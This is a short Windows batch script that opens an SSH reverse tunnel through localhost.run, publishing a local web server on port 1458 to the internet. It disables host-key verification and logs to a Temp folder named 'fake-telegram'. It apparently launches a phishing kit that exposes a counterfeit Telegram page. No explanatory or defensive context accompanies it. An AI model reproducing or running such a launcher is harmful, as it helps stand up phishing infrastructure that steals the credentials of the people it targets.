@echo off
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=NUL -R 80:localhost:1458 nokey@localhost.run > C:\Users\PC-ali\AppData\Local\Temp\fake-telegram\tunnel.log 2>&1
